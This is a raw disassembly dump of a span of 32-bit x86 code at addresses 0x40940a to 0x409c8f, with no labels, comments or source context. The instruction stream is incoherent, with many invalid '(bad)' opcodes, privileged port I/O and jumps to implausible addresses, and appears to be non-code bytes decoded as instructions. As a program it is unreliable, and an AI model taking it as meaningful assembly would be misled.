  40940a:	mov    esp,0xf9cbc6f4
  40940f:	retf   
  409410:	or     esi,esi
  409412:	cld    
  409413:	add    edi,eax
  409415:	loope  0x4093e5
  409417:	mov    dl,0xbf
  409419:	loope  0x4093e7
  40941b:	icebp  
  40941c:	jmp    0x4093ef
  40941e:	(bad)
  409421:	call   0xfefa53e5
  409426:	in     eax,dx
  409427:	add    ebp,esi
  409429:	inc    DWORD PTR [ecx+eax*1]
  40942c:	cmc    
  40942d:	add    DWORD PTR [edi-0x11252935],edi
  409433:	pop    es
  409434:	int3   
  409435:	stc    
  409436:	rol    edx,1
  409438:	rcl    cl,0xd0
  40943b:	hlt    
  40943c:	(bad)  
  40943d:	call   0xeb2f8206
  409442:	icebp  
  409443:	hlt    
  409444:	mov    ebp,0xf0bdfddf
  409449:	mov    esp,0xcbe3d305
  40944e:	rol    BYTE PTR [ecx],0xe4
  409451:	shl    dh,0x2
  409454:	or     ebp,esp
  409456:	loopne 0x409440
  409458:	out    0xbc,al
  40945a:	mov    bh,0xd7
  40945c:	(bad)  
  40945d:	int    0xd2
  40945f:	call   0xec116d5e
  409464:	aad    0xc9
  409466:	bnd ret 
  409468:	fnstcw WORD PTR [ebp-0x20280605]
  40946e:	mov    BYTE PTR [eax],0xeb
  409471:	add    esi,eax
  409473:	(bad)  
  409474:	stc    
  409475:	loop   0x40943b
  409477:	shl    BYTE PTR [edi-0xd4e3738],cl
  40947d:	ror    bl,cl
  40947f:	in     eax,0xd4
  409481:	xlat   BYTE PTR ds:[ebx]
  409482:	(bad)  
  409484:	jecxz  0x409488
  409486:	mov    bh,0x3
  409488:	icebp  
  409489:	(bad)  
  40948a:	cld    
  40948b:	add    eax,ebx
  40948d:	pop    es
  40948e:	add    al,0xc1
  409490:	hlt    
  409491:	retf   0xfcd
  409494:	jmp    0xd0ae:0xe0acc3e5
  40949b:	mov    bh,0xee
  40949d:	into   
  40949e:	call   0xdcff8595
  4094a3:	int3   
  4094a4:	(bad)  
  4094a5:	aam    0x1
  4094a7:	xlat   BYTE PTR ds:[ebx]
  4094a8:	loope  0x409470
  4094aa:	ret    
  4094ab:	add    al,0xea
  4094ad:	or     edi,edx
  4094af:	add    eax,esp
  4094b1:	(bad)  
  4094b2:	(bad)  
  4094b3:	sti    
  4094b4:	jmp    0xd1b1:0xe5e6bedc
  4094bb:	mov    ah,0xe9
  4094bd:	mov    bh,0xf9
  4094bf:	rcl    eax,1
  4094c1:	ror    dh,1
  4094c3:	mov    esi,0xcdecbbd6
  4094c8:	std    
  4094c9:	loope  0x4094c3
  4094cb:	add    bh,ah
  4094cd:	sti    
  4094ce:	out    0xfb,al
  4094d0:	fiadd  WORD PTR [ebx]
  4094d2:	or     bl,ch
  4094d4:	into   
  4094d5:	or     ah,cl
  4094d7:	ret    0xf3bc
  4094da:	repz sti 
  4094dc:	mov    ch,0xb2
  4094de:	out    0xf3,al
  4094e0:	leave  
  4094e1:	rcl    cl,cl
  4094e3:	int    0xea
  4094e5:	mov    esi,0xecd9e1fa
  4094ea:	add    eax,0xdadfe2f8
  4094ef:	loope  0x4094d7
  4094f1:	aad    0xe1
  4094f3:	(bad)  
  4094f4:	loopne 0x4094e4
  4094f6:	in     eax,dx
  4094f7:	mov    al,0xe2
  4094f9:	out    0xaf,al
  4094fb:	mov    cl,0xd2
  4094fd:	leave  
  4094fe:	aam    0xb0
  409500:	mov    ebx,0xdad8d5f9
  409505:	(bad)  
  409507:	stc    
  409508:	in     al,dx
  409509:	loopne 0x409504
  40950b:	add    dh,dh
  40950d:	loope  0x4094d4
  40950f:	fcomp  st(7)
  409511:	call   0xeb215ae3
  409516:	lock jmp 0xf4013e0a
  40951c:	mov    cl,0xf0
  40951e:	in     eax,0xf1
  409520:	cmc    
  409521:	mov    dh,0xc5
  409523:	retf   
  409524:	shl    ch,cl
  409526:	cmc    
  409527:	sar    DWORD PTR [esi+ecx*8-0x471bf83b],0xfb
  40952f:	add    esp,edi
  409531:	aam    0x7
  409533:	jmp    0x40951a
  409535:	cli    
  409536:	(bad)
  409539:	mov    esi,0xaccfc0eb
  40953e:	retf   0xbfdf
  409541:	in     eax,0xbb
  409543:	repz sar BYTE PTR [ecx-0x3430c47],cl
  40954a:	fild   WORD PTR [ecx]
  40954c:	jecxz  0x40950f
  40954e:	(bad)  
  40954f:	xlat   BYTE PTR ds:[ebx]
  409550:	add    al,BYTE PTR ds:0xceede5fe
  409556:	mov    bl,0xe6
  409558:	shl    dl,1
  40955a:	mov    ebp,0xe8c5b5c3
  40955f:	retf   0xf9f3
  409562:	fdiv   QWORD PTR [edx-0x343fe0a]
  409568:	mov    eax,0xf6fedcf4
  40956d:	pop    es
  40956e:	or     edi,edi
  409570:	(bad)  
  409572:	out    dx,eax
  409573:	out    dx,eax
  409574:	cli    
  409575:	or     ah,al
  409577:	out    dx,al
  409578:	lods   eax,DWORD PTR ds:[esi]
  409579:	shl    ch,0xfb
  40957c:	jmp    0xcafb8d73
  409581:	stc    
  409582:	aad    0xd7
  409584:	mov    ecx,0x6e8fed9
  409589:	fldlg2 
  40958b:	add    al,BYTE PTR [edi]
  40958d:	clc    
  40958e:	cld    
  40958f:	fisttp QWORD PTR [esi]
  409591:	(bad)  
  409592:	out    dx,eax
  409593:	push   es
  409594:	add    al,0xed
  409596:	fucom  st(1)
  409598:	scas   eax,DWORD PTR es:[edi]
  409599:	fucom  st(5)
  40959b:	mov    bh,0xda
  40959d:	sti    
  40959e:	loope  0x409590
  4095a0:	aam    0xee
  4095a2:	fcom   st(3)
  4095a4:	mov    esi,0x6d0f4ca
  4095a9:	cli    
  4095aa:	pop    es
  4095ab:	in     al,dx
  4095ac:	ret    0xbff7
  4095af:	add    bh,bl
  4095b1:	add    cl,ch
  4095b3:	(bad)  
  4095b4:	in     eax,dx
  4095b5:	add    edi,eax
  4095b7:	iret   
  4095b8:	int3   
  4095b9:	repz ror ebx,0xd0
  4095bd:	in     eax,0xf0
  4095bf:	repnz repnz iret 
  4095c2:	sti    
  4095c3:	out    dx,al
  4095c4:	std    
  4095c5:	jecxz  0x4095bc
  4095c7:	out    0xc1,eax
  4095c9:	rol    ch,cl
  4095cb:	repz ret 0xddf7
  4095cf:	div    dh
  4095d1:	or     eax,0x11ede50b
  4095d6:	shr    ecx,0xdd
  4095d9:	repnz lods al,BYTE PTR ds:[esi]
  4095db:	out    0xb2,eax
  4095dd:	rcl    bh,cl
  4095df:	jmp    0xd3006ed3
  4095e4:	icebp  
  4095e5:	enter  0xbcba,0xd7
  4095e9:	in     eax,0xfe
  4095eb:	shl    bl,0xde
  4095ee:	or     edi,ebp
  4095f0:	(bad)  
  4095f1:	or     edx,ebp
  4095f3:	adc    esp,esp
  4095f5:	out    dx,eax
  4095f6:	mov    dl,0xc3
  4095f8:	int    0xf7
  4095fa:	call   0xd63c7fd3
  4095ff:	(bad)
  409602:	cli    
  409603:	(bad)  
  409605:	fdivr  QWORD PTR [edi-0x44064326]
  40960b:	push   es
  40960c:	fcomip st,st(5)
  40960e:	call   0xc61ca110
  409613:	or     eax,0xe8e0cccf
  409618:	lods   eax,DWORD PTR ds:[esi]
  409619:	out    0xe0,eax
  40961b:	sti    
  40961c:	retf   
  40961d:	out    dx,al
  40961e:	jmp    0xd1f87eed
  409623:	lock jmp 0xf6df:0xd5f8eddd
  40962b:	loopne 0x409614
  40962d:	ret    0xf6d7
  409630:	std    
  409631:	(bad)  
  409633:	out    dx,eax
  409634:	leave  
  409635:	std    
  409636:	fld    st(0)
  409638:	test   al,0xce
  40963a:	(bad)  
  40963b:	out    dx,eax
  40963c:	int    0xce
  40963e:	into   
  40963f:	aam    0xca
  409641:	call   0xdb096541
  409646:	ret    
  409647:	cld    
  409648:	into   
  409649:	rcr    dl,1
  40964b:	mov    BYTE PTR [edi],0x4
  40964e:	ret    0xe9f8
  409651:	(bad)  
  409652:	in     al,dx
  409653:	std    
  409654:	repz iret 
  409656:	rol    esp,cl
  409658:	out    0xee,eax
  40965a:	retf   
  40965b:	rcr    ebx,1
  40965d:	fcmovb st,st(6)
  40965f:	icebp  
  409660:	call   0xf0378a31
  409665:	lock add al,bl
  409668:	repz sti 
  40966a:	fucom  st(7)
  40966c:	cld    
  40966d:	add    ch,dl
  40966f:	add    cl,BYTE PTR [ebx]
  409671:	jmp    0x4f6363
  409676:	shl    ecx,cl
  409678:	scas   eax,DWORD PTR es:[edi]
  409679:	not    ch
  40967b:	rcl    ebp,0xc1
  40967e:	cmc    
  40967f:	mov    ebx,0xd4f2fdd6
  409684:	dec    ecx
  409686:	aam    0xbd
  409688:	std    
  409689:	mov    edi,0x202e6f5
  40968e:	mov    BYTE PTR [ecx],0xeb
  409691:	retf   0xe7c4
  409694:	out    dx,al
  409695:	fdiv   DWORD PTR [ebx-0x3639372f]
  40969b:	mov    bl,0xcf
  40969d:	cmc    
  40969e:	int    0xf9
  4096a0:	cli    
  4096a1:	mov    dh,0xda
  4096a3:	repz sar bh,cl
  4096a6:	inc    DWORD PTR [eax]
  4096a8:	clc    
  4096a9:	mov    DWORD PTR [edx],0xf0dbf5e4
  4096af:	rcl    bh,0xce
  4096b2:	add    dh,ah
  4096b4:	ficom  DWORD PTR [ecx]
  4096b6:	ret    0xadd3
  4096b9:	(bad)  
  4096ba:	mov    ch,0xf1
  4096bc:	mov    ah,0xeb
  4096be:	leave  
  4096bf:	jmp    0xe9f4:0xceeaffbf
  4096c6:	add    dh,ah
  4096c8:	(bad)  
  4096c9:	xlat   BYTE PTR ds:[ebx]
  4096ca:	add    ebx,esp
  4096cc:	xlat   BYTE PTR ds:[ebx]
  4096cd:	neg    bl
  4096cf:	sar    BYTE PTR [ebp-0x1113071a],1
  4096d5:	adc    ebp,esp
  4096d7:	in     eax,dx
  4096d8:	out    0xdd,eax
  4096da:	jmp    0xb7f1:0xb4f5b7cd
  4096e1:	les    edi,FWORD PTR [ebp-0x24124a15]
  4096e7:	fcmove st,st(4)
  4096e9:	sar    ebp,0xe2
  4096ec:	rol    eax,1
  4096ee:	loop   0x4096ec
  4096f0:	in     eax,0xe6
  4096f2:	in     eax,0xce
  4096f4:	clc    
  4096f5:	shr    ebx,cl
  4096f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096f8:	loope  0x4096c3
  4096fa:	loopne 0x4096f1
  4096fc:	mov    bh,0xe7
  4096fe:	mov    bh,0xd1
  409700:	lock mov eax,0xbceacadb
  409706:	ror    bh,cl
  409708:	(bad)  
  409709:	int3   
  40970a:	repz jecxz 0x4096e5
  40970d:	add    ah,cl
  40970f:	imul   bh
  409711:	jmp    0xe1199aeb
  409716:	enter  0xf7f3,0xea
  40971a:	lock leave 
  40971c:	(bad)  
  40971d:	aad    0xb1
  40971f:	call   0xd41c81da
  409724:	ret    
  409725:	stc    
  409726:	fucomp st(5)
  409728:	loopne 0x409705
  40972a:	fdivr  st,st(2)
  40972c:	sti    
  40972d:	fcmovnb st,st(2)
  40972f:	pmulhw mm1,mm1
  409732:	(bad)  
  409733:	std    
  409734:	or     al,0xe6
  409736:	iret   
  409737:	(bad)  
  409738:	mov    dl,0xf6
  40973a:	repz shl bl,1
  40973d:	cli    
  40973e:	aam    0xc8
  409740:	bnd jmp 0x40971e
  409743:	inc    bl
  409745:	mov    ah,0xe3
  409747:	rcr    edi,0xf4
  40974a:	mov    edi,0xe7c2f1c1
  40974f:	in     al,0xfd
  409751:	aad    0xfc
  409753:	dec    eax
  409755:	pop    es
  409756:	stos   BYTE PTR es:[edi],al
  409757:	scas   al,BYTE PTR es:[edi]
  409758:	icebp  
  409759:	ror    ch,0xc4
  40975c:	loope  0x409733
  40975e:	not    al
  409760:	(bad)  
  409761:	out    dx,eax
  409762:	ror    edx,cl
  409764:	mov    esp,0xf2d4eff8
  409769:	rcr    bl,1
  40976b:	push   es
  40976c:	add    edi,edx
  40976e:	add    eax,0xfcdfe3e3
  409773:	cli    
  409774:	push   es
  409775:	into   
  409776:	test   eax,0xd6b3bdf7
  40977b:	shl    bl,cl
  40977d:	mov    edi,0xd7c9d7ee
  409783:	fcomip st,st(5)
  409785:	fdecstp 
  409787:	iret   
  409788:	mov    ch,0xbc
  40978a:	mov    BYTE PTR [ebx],0x5
  40978d:	repnz (bad) 
  40978f:	fmul   st,st(1)
  409791:	retf   
  409792:	out    0xe1,al
  409794:	fsubp  st(3),st
  409796:	shl    bl,1
  409798:	in     eax,dx
  409799:	repz mov ch,0xc5
  40979c:	mov    al,0xcf
  40979e:	out    dx,eax
  40979f:	lock mov ah,0xba
  4097a2:	jmp    0x409796
  4097a4:	(bad)  
  4097a5:	retf   0xdef5
  4097a8:	sar    BYTE PTR [edi-0x4725f820],0xcb
  4097af:	or     al,BYTE PTR [esi]
  4097b1:	sar    dl,0xec
  4097b4:	out    dx,al
  4097b5:	iret   
  4097b6:	retf   0xb7cb
  4097b9:	loopne 0x409770
  4097bb:	shl    ch,cl
  4097bd:	stc    
  4097be:	repnz not ebx
  4097c1:	cli    
  4097c2:	in     eax,0xc9
  4097c4:	cmc    
  4097c5:	leave  
  4097c6:	add    dl,ch
  4097c8:	loop   0x4097ab
  4097ca:	in     al,dx
  4097cb:	fcmovnb st,st(1)
  4097cd:	retf   0xc5f7
  4097d0:	std    
  4097d1:	add    eax,0xfdfe9e5
  4097d6:	into   
  4097d7:	retf   0xd5e8
  4097da:	int    0xc2
  4097dc:	retf   0xdbe0
  4097df:	int3   
  4097e0:	fucomip st,st(2)
  4097e2:	hlt    
  4097e3:	fdivr  QWORD PTR [ebx+edi*8-0x3efd260f]
  4097ea:	rcl    esp,1
  4097ec:	mul    cl
  4097ee:	jmp    0xfaed:0xe4f6ca03
  4097f5:	jecxz  0x4097df
  4097f7:	test   al,0xdd
  4097f9:	jecxz  0x4097e6
  4097fb:	in     al,0xf1
  4097fd:	in     al,0xb0
  4097ff:	mov    bh,0xf9
  409801:	(bad)  
  409802:	lock fcomi st,st(0)
  409805:	fdivr  st,st(2)
  409807:	(bad)  
  409808:	aam    0x5
  40980a:	add    ecx,esi
  40980c:	jmp    0xdcbc:0xf50f01f9
  409813:	int3   
  409814:	std    
  409815:	jmp    FWORD PTR [ebx+eiz*8-0x2d324216]
  40981c:	repnz loope 0x409815
  40981f:	into   
  409820:	clc    
  409821:	mov    esi,0xb9f503e8
  409826:	stc    
  409827:	call   0xbd289402
  40982c:	loopne 0x40982a
  40982e:	fucomi st,st(7)
  409830:	add    BYTE PTR [eax],al
  409832:	mov    dl,0xda
  409835:	fbstp  TBYTE PTR [edx-0x18231128]
  40983b:	jmp    0xd9f9:0xd5c1cbd4
  409842:	test   DWORD PTR [ebx],0xf8f9efc9
  409848:	(bad)  
  409849:	std    
  40984a:	add    edx,esi
  40984c:	fst    st(0)
  40984e:	in     al,0xf4
  409850:	mov    ebp,0xfdfe0afb
  409855:	shl    bh,0xde
  409858:	div    DWORD PTR [edx-0x384c3554]
  40985e:	mov    edx,0xc4bab7f9
  409863:	int3   
  409864:	in     al,dx
  409865:	fdivr  DWORD PTR [ebx-0x2213122e]
  40986b:	add    eax,esi
  40986d:	or     eax,DWORD PTR [eax]
  40986f:	std    
  409870:	call   0xdf4e635e
  409875:	jmp    0xb4cd:0xecf3dcaa
  40987c:	cmc    
  40987d:	test   bl,0xca
  409880:	mov    bh,0xd4
  409882:	mov    edx,0xd3ccd8f7
  409887:	(bad)  
  409888:	rcl    ah,1
  40988a:	rcr    bh,0xd2
  40988d:	aam    0xdf
  40988f:	fiadd  WORD PTR [edi]
  409891:	in     eax,0xe0
  409893:	jmp    0xc0e7:0xc7cbfee4
  40989a:	(bad)  
  40989b:	out    0xcb,al
  40989d:	loop   0x409878
  40989f:	(bad)  
  4098a1:	retf   0xdedd
  4098a4:	mov    eax,0xc2c100db
  4098a9:	pop    es
  4098aa:	(bad)  
  4098ac:	aad    0xf6
  4098ae:	cli    
  4098af:	leave  
  4098b0:	add    al,0xb
  4098b2:	(bad)  
  4098b4:	loope  0x409890
  4098b6:	in     al,dx
  4098b7:	lods   al,BYTE PTR ds:[esi]
  4098b8:	leave  
  4098b9:	scas   al,BYTE PTR es:[edi]
  4098ba:	not    ebx
  4098bc:	imul   dl
  4098be:	sti    
  4098bf:	shr    dh,1
  4098c1:	rcr    bh,cl
  4098c3:	call   0xdefd8fc4
  4098c8:	loopne 0x4098bd
  4098ca:	stc    
  4098cb:	add    BYTE PTR [ecx],al
  4098cd:	loopne 0x4098ad
  4098cf:	out    dx,eax
  4098d0:	aad    0xc4
  4098d2:	or     dh,al
  4098d4:	les    eax,FWORD PTR [ecx+esi*4]
  4098d7:	mov    cl,0xe9
  4098d9:	mov    esp,0xc5e0eae8
  4098de:	mov    ecx,0xddc9b8e5
  4098e3:	icebp  
  4098e4:	mov    eax,0xd8d0dbbd
  4098e9:	out    0xe7,eax
  4098eb:	lock shl ecx,1
  4098ee:	shr    eax,1
  4098f0:	retf   0xcef5
  4098f3:	cld    
  4098f4:	jmp    0xe82e4ae3
  4098f9:	int3   
  4098fa:	mov    bh,0xe4
  4098fc:	rcl    esp,0xfa
  4098ff:	mov    dl,0xd9
  409901:	mov    edx,0xccb9eadf
  409906:	xlat   BYTE PTR ds:[ebx]
  409907:	loop   0x4098f9
  409909:	fcmovu st,st(5)
  40990b:	repnz shl ebx,cl
  40990e:	retf   
  40990f:	out    dx,eax
  409910:	sar    al,0x3
  409913:	hlt    
  409914:	or     al,cl
  409916:	repnz icebp 
  409918:	lock fsubp st(7),st
  40991b:	aad    0xb6
  40991d:	out    dx,eax
  40991e:	in     eax,0xba
  409920:	mov    edi,0xcaeef4e5
  409925:	mov    ebx,0xdef6f1d3
  40992a:	rol    ch,1
  40992c:	add    edx,esi
  40992e:	(bad)  
  40992f:	fdiv   st(6),st
  409931:	or     ebx,eax
  409933:	jmp    0xc10e9547
  409938:	faddp  st(6),st
  40993a:	int    0xc9
  40993c:	mov    ebx,0xe4b1f2ed
  409941:	lods   al,BYTE PTR ds:[esi]
  409942:	cmc    
  409943:	leave  
  409944:	leave  
  409945:	xlat   BYTE PTR ds:[ebx]
  409946:	call   0xbf0f611e
  40994b:	rol    dl,cl
  40994d:	rcl    eax,1
  40994f:	(bad)  
  409950:	enter  0xe402,0xdd
  409954:	lds    edx,FWORD PTR [ecx]
  409956:	int    0xd3
  409958:	out    0xcc,al
  40995a:	in     al,dx
  40995b:	call   0xfc346354
  409960:	fucomi st,st(7)
  409962:	into   
  409963:	aad    0xff
  409965:	loop   0x409946
  409967:	aam    0xc0
  409969:	fld    DWORD PTR ds:0xcbc303dc
  40996f:	fsincos 
  409971:	fsubp  st(1),st
  409973:	clc    
  409974:	(bad)  
  409975:	icebp  
  409976:	fadd   st,st(3)
  409978:	icebp  
  409979:	mov    ebp,0xefd6f1d6
  40997e:	(bad)
  409981:	aam    0xdf
  409983:	fdiv   st(2),st
  409985:	aad    0xee
  409987:	mov    dh,0xbc
  409989:	rcl    eax,cl
  40998b:	std    
  40998c:	cli    
  40998d:	fcomi  st,st(7)
  40998f:	pinsrw mm2,esi,0x8
  409993:	in     al,dx
  409994:	call   0xc82d7698
  409999:	jmp    0xfbe1:0xc4cbaac4
  4099a0:	mov    ecx,0xdfbad8f1
  4099a5:	in     eax,dx
  4099a6:	ret    
  4099a7:	(bad)  
  4099a8:	mul    edx
  4099aa:	jecxz  0x409978
  4099ac:	fsubr  st,st(2)
  4099ae:	cli    
  4099af:	shr    al,1
  4099b1:	add    eax,0x5d3ea00
  4099b6:	mov    bl,0xca
  4099b8:	in     al,0xc4
  4099ba:	in     eax,0xd2
  4099bc:	test   eax,0xcbb0c8cb
  4099c1:	out    0xe9,al
  4099c3:	(bad)  
  4099c4:	fsubrp st(3),st
  4099c6:	mov    edx,0xf1e1b8e8
  4099cb:	ret    
  4099cc:	hlt    
  4099cd:	cli    
  4099ce:	fild   WORD PTR [edx]
  4099d0:	sti    
  4099d1:	(bad)  
  4099d2:	in     al,dx
  4099d3:	cli    
  4099d4:	add    BYTE PTR [edi],cl
  4099d6:	loop   0x4099a4
  4099d8:	shr    eax,0xcc
  4099db:	out    0xb3,eax
  4099dd:	fnstcw WORD PTR [ecx-0xc260629]
  4099e3:	aam    0xb8
  4099e5:	enter  0xb9,0xde
  4099e9:	(bad)  
  4099ea:	in     al,dx
  4099eb:	shl    dh,cl
  4099ed:	loop   0x4099f1
  4099ef:	enter  0xcbd4,0xc5
  4099f3:	fucom  st(1)
  4099f5:	push   es
  4099f6:	lods   eax,DWORD PTR ds:[esi]
  4099f7:	shr    ebp,0xe8
  4099fa:	leave  
  4099fb:	in     al,0xe2
  4099fd:	test   esp,0xbecde6d1
  409a03:	mov    dl,0xec
  409a05:	icebp  
  409a06:	mov    bh,0xd5
  409a08:	sti    
  409a09:	loop   0x4099e6
  409a0b:	mov    esp,0x9df0706
  409a10:	(bad)
  409a13:	(bad)  
  409a14:	(bad)
  409a17:	mov    eax,0xd5f6c3d6
  409a1c:	(bad)  
  409a1d:	in     al,0xda
  409a1f:	retf   
  409a20:	mov    cl,0xcd
  409a22:	out    dx,al
  409a23:	mov    esi,0xd3d7e9bb
  409a28:	cli    
  409a29:	std    
  409a2a:	add    bh,al
  409a2c:	loopne 0x409a04
  409a2e:	out    0xc8,al
  409a30:	add    eax,DWORD PTR [ecx]
  409a32:	int    0xcd
  409a34:	out    dx,eax
  409a35:	fcomip st,st(3)
  409a37:	stos   BYTE PTR es:[edi],al
  409a38:	ret    
  409a39:	mov    bl,0xc8
  409a3b:	mov    al,0xc7
  409a3d:	loope  0x409a17
  409a3f:	loopne 0x409a12
  409a41:	mov    ecx,0xe8fbddfa
  409a46:	(bad)  
  409a48:	shl    eax,1
  409a4a:	add    al,0xfd
  409a4c:	loope  0x409a0f
  409a4e:	(bad)  
  409a50:	(bad)  
  409a51:	fisttp QWORD PTR [ecx]
  409a53:	aam    0xda
  409a55:	add    BYTE PTR [edx-0x422e411c],ch
  409a5b:	scas   al,BYTE PTR es:[edi]
  409a5c:	jmp    0xdcf1:0xd7f4b7d3
  409a63:	mov    eax,0x2f5b0d0
  409a68:	fyl2xp1 
  409a6a:	cld    
  409a6b:	not    dh
  409a6d:	jecxz  0x409a74
  409a6f:	aam    0xf9
  409a71:	(bad)  
  409a72:	jmp    0xcbd1:0xd9eaceef
  409a79:	jmp    0x409a70
  409a7b:	aad    0xb2
  409a7d:	mov    cl,0xb1
  409a7f:	in     al,dx
  409a80:	jmp    0xf3185a43
  409a85:	leave  
  409a86:	out    dx,al
  409a87:	mov    edi,0xf5c1d9e2
  409a8c:	hlt    
  409a8d:	mov    esp,0xdd405c5
  409a92:	add    edi,edi
  409a94:	out    0xda,al
  409a96:	into   
  409a97:	in     eax,dx
  409a98:	ror    ebp,cl
  409a9a:	retf   0xcee8
  409a9d:	in     eax,0xb2
  409a9f:	out    dx,eax
  409aa0:	jmp    0xec02:0xeafcb9b5
  409aa7:	mov    edi,0xe7c0f2d5
  409aac:	pop    es
  409aad:	mul    esp
  409aaf:	loop   0x409ab7
  409ab1:	push   cs
  409ab2:	or     dh,ch
  409ab4:	ror    DWORD PTR [edi],0xea
  409ab7:	mov    cl,0xeb
  409ab9:	(bad)  
  409aba:	mov    al,0xeb
  409abc:	mul    edx
  409abe:	in     eax,dx
  409abf:	in     al,0xcc
  409ac1:	in     eax,dx
  409ac2:	fsub   st(0),st
  409ac4:	add    ebx,edi
  409ac6:	mov    esi,0xf6d900df
  409acb:	ret    
  409acc:	rcl    dl,1
  409ace:	fdivr  st(5),st
  409ad0:	fcmovu st,st(3)
  409ad2:	out    0xfe,eax
  409ad4:	out    0xe5,eax
  409ad6:	fdivrp st(3),st
  409ad8:	mul    DWORD PTR [eax+edx*8-0x2c283f33]
  409adf:	cli    
  409ae0:	fcmovnb st,st(6)
  409ae2:	repz lock rol DWORD PTR [ebx],cl
  409ae6:	rol    DWORD PTR [edi],cl
  409ae8:	aam    0xfc
  409aea:	mov    edi,0xff0bc6f1
  409aef:	loopne 0x409abb
  409af1:	or     ch,ah
  409af3:	call   0xea0073e1
  409af8:	jmp    0x409acc
  409afa:	aad    0xef
  409afc:	out    dx,eax
  409afd:	mov    dh,0xf9
  409aff:	sti    
  409b00:	(bad)
  409b03:	cmc    
  409b04:	fdivr  DWORD PTR [ecx-0x1f130f02]
  409b0a:	aam    0xeb
  409b0c:	mov    ecx,0xbc6ebdb
  409b11:	(bad)  
  409b13:	in     al,0xe9
  409b15:	icebp  
  409b16:	(bad)  
  409b18:	call   0xe8378304
  409b1d:	out    dx,eax
  409b1e:	imul   cl
  409b20:	mov    edi,0xcdb8fdb0
  409b25:	lock out dx,eax
  409b27:	in     eax,dx
  409b28:	mov    ecx,0xf9d4f5f6
  409b2d:	hlt    
  409b2e:	add    al,0xe1
  409b30:	or     cl,ah
  409b32:	enter  0xdecf,0xfd
  409b36:	mov    esp,0xc5b1b7e0
  409b3b:	shl    DWORD PTR [esi-0x4a0c4b4d],1
  409b41:	(bad)  
  409b42:	leave  
  409b43:	in     eax,dx
  409b44:	mov    cl,0xe8
  409b46:	icebp  
  409b47:	mov    esi,0xd4def2d7
  409b4c:	icebp  
  409b4d:	jmp    0x409b38
  409b4f:	fisttp QWORD PTR [ebx]
  409b51:	out    dx,al
  409b52:	add    ebx,ebp
  409b54:	jecxz  0x409b43
  409b56:	stos   DWORD PTR es:[edi],eax
  409b57:	call   0xc9106738
  409b5c:	shl    al,1
  409b5e:	lock mov al,0xe9
  409b61:	leave  
  409b62:	mov    edx,0xecbddaef
  409b67:	loope  0x409b48
  409b69:	repz sar ebp,0xf7
  409b6d:	(bad)  
  409b6e:	jecxz  0x409b36
  409b70:	add    al,0xde
  409b72:	fucomi st,st(2)
  409b74:	in     al,0xca
  409b76:	ror    edx,cl
  409b78:	call   0xf22b6568
  409b7d:	out    0xd0,al
  409b7f:	mov    ebx,0xd0dfe6ef
  409b84:	(bad)  
  409b85:	mov    al,0xfe
  409b87:	sti    
  409b88:	pop    es
  409b89:	(bad)  
  409b8b:	icebp  
  409b8c:	push   es
  409b8d:	loope  0x409b94
  409b8f:	jmp    0xe9:0xf4c9e5f4
  409b96:	shr    DWORD PTR [ecx-0x16131831],cl
  409b9c:	out    dx,al
  409b9d:	fnstenv [ecx+edi*8-0x3b0f3221]
  409ba4:	cmc    
  409ba5:	fstp   TBYTE PTR [edi-0x1a20fdfe]
  409bab:	push   es
  409bac:	fcomp  st(3)
  409bae:	mov    ch,0x1
  409bb1:	enter  0xe2fb,0xc5
  409bb5:	or     BYTE PTR [ebp+ebx*8-0x2b1f1641],ch
  409bbc:	fcmovne st,st(0)
  409bbe:	rol    dh,cl
  409bc0:	mov    al,0xd0
  409bc2:	cli    
  409bc3:	out    dx,al
  409bc4:	mov    ch,0xd2
  409bc6:	ret    0xfdbd
  409bc9:	(bad)  
  409bca:	fmul   st(4),st
  409bcc:	shr    ebx,1
  409bce:	aam    0xca
  409bd0:	std    
  409bd1:	cld    
  409bd2:	stc    
  409bd3:	int    0xe8
  409bd5:	jecxz  0x409bbe
  409bd7:	mov    esp,0xb0f7d1ec
  409bdc:	retf   
  409bdd:	mov    ah,0xc5
  409bdf:	rcr    bh,0xff
  409be2:	mov    ah,0xca
  409be4:	enter  0xd5e1,0x3
  409be8:	(bad)  
  409be9:	div    edi
  409beb:	mov    esi,0x9fde9d4
  409bf0:	out    0xe2,al
  409bf2:	jmp    0xd31f5df5
  409bf7:	ret    0xbcc5
  409bfa:	mov    al,0xb7
  409bfc:	neg    ebx
  409bfe:	scas   eax,DWORD PTR es:[edi]
  409bff:	(bad)  
  409c00:	aam    0xf1
  409c02:	in     al,dx
  409c03:	int    0xd2
  409c05:	shl    esi,cl
  409c07:	cmc    
  409c08:	loope  0x409c0f
  409c0a:	in     al,0xe4
  409c0c:	fld    QWORD PTR [edi+eax*8]
  409c0f:	add    ebp,edi
  409c11:	add    edx,ebx
  409c13:	retf   
  409c14:	push   es
  409c15:	adc    edx,ecx
  409c17:	jecxz  0x409bc8
  409c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c1a:	mov    cl,0xc4
  409c1c:	(bad)  
  409c1d:	stc    
  409c1e:	clc    
  409c1f:	mov    bh,0xd4
  409c21:	fmulp  st(5),st
  409c23:	mov    dh,0xeb
  409c25:	div    BYTE PTR [edi-0x91a2c44]
  409c2b:	shl    ebx,0xb8
  409c2e:	ror    BYTE PTR [edx],0xf8
  409c31:	add    eax,0xcfdeef9
  409c36:	jmp    0xd2c0:0xe4d2bfde
  409c3d:	into   
  409c3e:	out    0xcc,eax
  409c40:	(bad)  
  409c41:	stc    
  409c42:	ror    dl,1
  409c44:	fmul   st(2),st
  409c46:	cli    
  409c47:	loope  0x409c2f
  409c49:	hlt    
  409c4a:	repnz fdiv st,st(6)
  409c4d:	fcmovnbe st,st(5)
  409c4f:	fsub   st(0),st
  409c51:	in     eax,dx
  409c52:	push   es
  409c53:	dec    DWORD PTR [eax]
  409c55:	fsub   st,st(1)
  409c57:	int    0xa8
  409c59:	mov    esp,0xb1a9e6ce
  409c5e:	retf   
  409c5f:	mov    bh,0xcb
  409c61:	in     eax,dx
  409c62:	clc    
  409c63:	retf   
  409c64:	dec    cl
  409c66:	ret    0xd8c3
  409c69:	idiv   DWORD PTR [esi-0x6f52f42]
  409c6f:	stc    
  409c70:	(bad)  
  409c71:	(bad)  
  409c72:	aad    0xd8
  409c74:	int3   
  409c75:	in     eax,0xb2
  409c77:	rcr    ch,cl
  409c79:	jmp    0xf1d8:0xcdfac8b0
  409c80:	call   0xbdf68543
  409c85:	ret    
  409c86:	(bad)  
  409c87:	shl    DWORD PTR [ebp-0x2021e19],1
  409c8d:	or     esi,eax
  409c8f:	push   es
